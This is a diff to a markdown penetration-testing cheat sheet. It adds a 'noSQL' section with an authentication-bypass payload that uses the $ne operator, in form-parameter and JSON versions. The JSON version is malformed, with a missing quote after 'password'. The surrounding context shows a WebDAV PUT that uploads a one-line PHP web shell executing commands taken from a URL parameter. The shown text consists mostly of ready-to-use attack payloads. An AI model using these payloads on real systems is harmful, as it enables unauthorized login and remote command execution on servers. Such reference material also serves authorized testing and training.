@@ -16,7 +16,7 @@
 - [Redis](#Redis)
 - [VNC](#VNC)
 - [Webdav](#Webdav)
-- [MongoDB](#MongoDB)
+- [noSQL](#noSQL)
 - [Port knocking](#Port_knocking)
 - [Shell Shock](#Shellshock)
 - [Apache Tomcat](#Apache-Tomcat)
@@ -933,6 +933,19 @@ PUT /test/shell.php
 
 <?php system($_GET["cmd"])?>
 ```
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
+# noSQL
+- Basic auth bypass
+```
+username[$ne]=admin&password[$ne]
+
+json:
+
+{"username": {"$ne": null}, "password: {"$ne": null} }
+```
+
 -------------------------------------------------------------------------------------------------------------------------------------
 
 # Port_knocking
